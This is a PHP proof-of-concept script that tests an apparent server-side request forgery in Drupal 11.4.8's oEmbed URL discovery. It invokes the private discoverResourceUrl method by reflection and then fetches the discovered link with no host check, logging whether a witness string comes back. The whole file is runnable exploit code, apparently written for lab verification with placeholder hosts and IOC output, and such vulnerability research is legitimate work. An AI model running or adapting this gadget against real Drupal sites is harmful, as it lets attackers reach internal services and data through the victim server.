#!/usr/bin/env php
<?php

/**
 * Gadget: Drupal 11.4.8 UrlResolver::discoverResourceUrl plus ResourceFetcher GET.
 *
 * Pin: tag 11.4.8 / 61044508071749629aaf3380aa85971e94df9e84
 * First hop is host-gated. The discovered href is fetched with no host check.
 */

declare(strict_types=1);

use Drupal\Core\Site\Settings;
use Drupal\media\OEmbed\UrlResolver;
use GuzzleHttp\Client;
use GuzzleHttp\RequestOptions;
use Psr\Http\Client\ClientExceptionInterface;

const PIN_VERSION = '11.4.8';
const PIN_SHA = '61044508071749629aaf3380aa85971e94df9e84';
const WITNESS_DEFAULT = 'DRUPAL-OEMBED-SSRF-WITNESS';

$root = __DIR__;
require $root . '/vendor/autoload.php';

spl_autoload_register(static function (string $class) use ($root): void {
    $map = [
        'Drupal\\media\\OEmbed\\UrlResolver' => $root . '/pin/UrlResolver.php',
        'Drupal\\media\\OEmbed\\UrlResolverInterface' => $root . '/pin/UrlResolverInterface.php',
        'Drupal\\Component\\Utility\\Html' => $root . '/pin/Html.php',
        'Drupal\\Core\\Site\\Settings' => $root . '/pin/Settings.php',
    ];
    if (isset($map[$class])) {
        require_once $map[$class];
    }
});

/**
 * @return array{patterns: string, url: string, witness: string}
 */
function parse_args(array $argv): array {
    $patterns = '';
    $url = getenv('FIRST_HOP_URL') ?: 'http://firsthop:8080/video.html';
    $witness = getenv('WITNESS') ?: WITNESS_DEFAULT;
    $count = count($argv);
    for ($i = 1; $i < $count; $i++) {
        $arg = $argv[$i];
        if ($arg === '--patterns' && isset($argv[$i + 1])) {
            $patterns = $argv[++$i];
            continue;
        }
        if ($arg === '--url' && isset($argv[$i + 1])) {
            $url = $argv[++$i];
            continue;
        }
        if ($arg === '--witness' && isset($argv[$i + 1])) {
            $witness = $argv[++$i];
        }
    }
    return ['patterns' => $patterns, 'url' => $url, 'witness' => $witness];
}

/**
 * @param list<string> $patterns
 */
function discover_and_fetch(array $patterns, string $url, string $witness): array {
    new Settings(['media_oembed_discovery_trusted_host_patterns' => $patterns]);
    $client = new Client([
        'http_errors' => false,
        'allow_redirects' => false,
        'timeout' => 5,
    ]);
    $resolver = (new ReflectionClass(UrlResolver::class))->newInstanceWithoutConstructor();
    $http_prop = (new ReflectionClass($resolver))->getProperty('httpClient');
    $http_prop->setAccessible(true);
    $http_prop->setValue($resolver, $client);

    $method = (new ReflectionClass($resolver))->getMethod('discoverResourceUrl');
    $method->setAccessible(true);
    $href = $method->invoke($resolver, $url);

    $out = [
        'pin' => PIN_VERSION,
        'sha' => PIN_SHA,
        'how' => 'gadget',
        'patterns' => $patterns,
        'first_hop_url' => $url,
        'discovered' => is_string($href) ? $href : false,
        'second_hop_status' => 0,
        'second_hop_error' => '',
        'witness_in_body' => false,
        'body_clip' => '',
    ];
    if (!is_string($href) || $href === '') {
        return $out;
    }

    // ResourceFetcher.php 50-53: unscoped GET of the discovered href.
    try {
        $response = $client->request('GET', $href, [
            RequestOptions::TIMEOUT => 5,
        ]);
    }
    catch (ClientExceptionInterface $exc) {
        $out['second_hop_error'] = $exc->getMessage();
        return $out;
    }
    $body = (string) $response->getBody();
    $out['second_hop_status'] = $response->getStatusCode();
    $out['body_clip'] = substr(str_replace(["\n", "\r"], ' ', $body), 0, 240);
    $out['witness_in_body'] = str_contains($body, $witness);
    return $out;
}

$opts = parse_args($argv);
$pattern_list = $opts['patterns'] === '' ? [] : [$opts['patterns']];
$result = discover_and_fetch($pattern_list, $opts['url'], $opts['witness']);
fwrite(STDERR, 'IOC gadget pin=' . PIN_VERSION . ' sha=' . PIN_SHA . PHP_EOL);
fwrite(
    STDERR,
    'IOC patterns=' . ($opts['patterns'] === '' ? '(empty)' : $opts['patterns'])
    . ' discovered=' . (is_string($result['discovered']) ? $result['discovered'] : 'false')
    . ' second_hop_status=' . $result['second_hop_status']
    . PHP_EOL
);
echo json_encode($result, JSON_UNESCAPED_SLASHES) . PHP_EOL;
exit(0);
